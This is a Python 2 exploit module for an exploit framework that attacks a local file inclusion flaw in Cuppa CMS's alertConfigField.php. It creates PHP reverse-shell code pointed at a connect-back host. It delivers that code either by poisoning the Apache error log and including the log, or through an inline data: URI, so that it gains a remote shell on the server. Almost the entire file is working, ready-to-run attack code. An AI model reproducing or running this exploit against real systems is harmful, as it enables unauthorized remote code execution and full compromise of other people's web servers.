#!/usr/bin/env python
import sys
import urllib2
import urllib

from Sploit import Sploit
from shellcodes.PhpShellcode import PhpShellcodes

INFO = {}
INFO['NAME'] = "ef_cuppacms_afd"
INFO['DESCRIPTION'] = "Cuppa CMS Local File Inclusion"
INFO['VENDOR'] = "http://www.cuppacms.com/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. 
    User tainted data is used when creating the file name that will be included into the current file. 
    PHP code in this file will be evaluated, non-PHP code will be embedded to the output. 
    This vulnerability can lead to full server compromise.
    """
INFO["DOWNLOAD_LINK"] = "https://www.exploit-db.com/apps/1b81777d9126b3056b58507dd39a38e1-cuppa_cms.zip"
INFO["LINKS"] = ["https://www.exploit-db.com/exploits/25971/", "https://evilzone.org/high-quality-tutorials/local-file-inclusion-%28lfi%29/"]
INFO['CHANGELOG']="8 Dec, 2015. Written by Gleg team."
INFO['PATH'] = "WEB/"

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.130"
OPTIONS["PORT"] = 80
OPTIONS["VHOST"] = "cuppacms"
OPTIONS["CONNECT_BACK_HOST"] = "192.168.1.110"
OPTIONS["LOG_FILE"] = "../../../apache/logs/error.log"
OPTIONS["METHOD"] = dict(options=["poison_log", "inline"], selected="poison_log")


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.php_shellcode_gen = PhpShellcodes()
        self.vuln_path = 'alerts/alertConfigField.php?urlConfig='
        self.listener_port = None


    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.vhost = self.args.get("VHOST", OPTIONS["VHOST"])
        self.vhost = self.vhost if not self.vhost.endswith("/") else self.vhost[0:-1]
        self.url = "http://{}:{}/{}/".format(self.host, self.port, self.vhost)
        self.connectback_host = self.args.get("CONNECT_BACK_HOST", OPTIONS["CONNECT_BACK_HOST"])
        self.log_file = self.args.get("LOG_FILE", OPTIONS["LOG_FILE"])
        self.method = self.args.get("METHOD", OPTIONS["METHOD"])
        if self.args['listener']:
            self.listener_port = self.args['listener']['PORT']

    def run_method1(self, shell):
        try:
            resp = urllib2.urlopen(self.url + shell)
        except urllib2.HTTPError, e:
            if e.code == 403:
                self.log("Injection complete")
            else:
                self.log('Injection not complete')
                return 1
        try:
            urllib2.urlopen(self.url + self.vuln_path + self.log_file)
        except urllib2.HTTPError, e:
            self.log("Can't connect to listener")
            return False
        return True

    def run_method2(self, shell):
        try:
            print self.url + self.vuln_path + "data:text/plain," + shell
            resp = urllib.urlopen(self.url + self.vuln_path + "data:text/plain," + shell)
        except urllib2.HTTPError, e:
            self.log("Can't connect to listener")
            return False
        return True

    def run(self):
        #Get options from gui
        self.args()
        if not self.listener_port or not self.connectback_host:
            self.log('Error.You must specify CONNECT_BACK_HOST and enable listener')
            self.finish(False)
            return 1
        shell = self.php_shellcode_gen.get_php_code_inline(self.connectback_host, self.listener_port)
        if self.method == "poison_log":
            if self.run_method1(shell):
                self.finish(True)
            else:
                self.finish(False)
        else:
            if self.run_method2(shell):
                self.finish(True)
            else:
                self.finish(False)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
